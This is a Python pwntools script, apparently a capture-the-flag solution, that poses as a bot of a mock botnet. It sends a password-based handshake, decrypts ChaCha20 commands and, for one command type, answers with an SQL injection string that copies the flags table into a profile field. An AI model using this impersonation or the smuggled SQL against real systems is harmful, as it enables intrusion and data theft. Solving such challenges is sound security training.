from pwn import *
from Crypto.Cipher import ChaCha20

PASSWORD = b"VipersNest"
XOR_KEY = 0xed
KEEP_ALIVE = b'SsS5Ss5SS5ss5S'

HOST = args.HOST if args.HOST else "localhost"
PORT = int(args.PORT) if args.PORT else 1337
SSL = args.SSL

# context.log_level = 'debug'
r = remote(HOST, PORT, ssl=SSL)

if args.TEAM_TOKEN:
    r.sendlineafter(b"token: ", args.TEAM_TOKEN.encode())


def checksum_generic(data, length):
    sum = 0
    ptr = 0
    while length >= 2:
        word = struct.unpack('!H', data[ptr:ptr + 2])[0]
        sum += word
        ptr += 2
        length -= 2

    if length == 1:
        sum += struct.unpack('!B', data[ptr:ptr + 1])[0]

    sum = (sum & 0xFFFF) + (sum >> 16)
    sum = (sum & 0xFFFF) + (sum >> 16)

    return ~sum & 0xFFFF


def create_handshake():
    magic = bytes(
        [0x0a, 0x0b, 0x0c, 0x0d, 0x0e, 0x0f, 0x00, 0x03, 0x02, 0x01, 0x02, 0x03, 0x04, 0x05, 0x05, 0x04, 0x03, 0x02,
         0x01])

    passwd = xor(PASSWORD, XOR_KEY)

    tmp = magic + bytes([len(PASSWORD)]) + passwd

    tmp += checksum_generic(tmp, len(tmp)).to_bytes(2, byteorder='little')
    return tmp


def decrypt_and_respond():
    command = r.recv(timeout=2)

    if command == b'':
        print('niente')
        sleep(1)
        return False

    command = xor(command, XOR_KEY)
    if command == KEEP_ALIVE:
        return False

    sleep_ms = int.from_bytes(command[:4], byteorder='big')
    type = command[4]

    print('sleep', sleep_ms)
    print('type:', type)

    sleep(sleep_ms)

    n_t = command[5]
    print('n_t:', n_t)

    command = command[6 + n_t * 4:]

    n_a = command[0]
    command = command[1:]
    print('n_a:', n_a)

    args = {}
    for i in range(n_a):
        if len(command) < 2:
            command += r.recv(2 - len(command))
        key = command[0]
        l = command[1]
        command = command[2:]

        if len(command) < l:
            command += r.recv(l - len(command))

        val = command[:l]
        args[key] = val

        command = command[l:]

        print('key:', key, 'len:', l, 'val:', val)

    # print('args:', args)

    match type:
        case 0:
            c = ChaCha20.new(key=args[2], nonce=args[3])
            if 4 in args:
                c.seek(args[4][0] * 64)
            comm = c.decrypt(args[1])
            print('comm:', comm)
            if b'echo' in comm:
                val = comm[comm.index(b'"') + 1:]
                val = val[:val.index(b'"')]
                r.send(val)
            else:
                r.send(b'ok')
        case 1:
            r.send(b'Never')
        case 2:
            r.send(xor(b"snakeCPU", args[1][:8]))
        case 6:
            r.send(b'INSERT INTO profiles(name) SELECT flag FROM flags;')
        case 3:
            print(args[1])
            return True
        case _:
            r.send(b'ok')

    return False


r.send(create_handshake())

while not decrypt_and_respond():
    pass
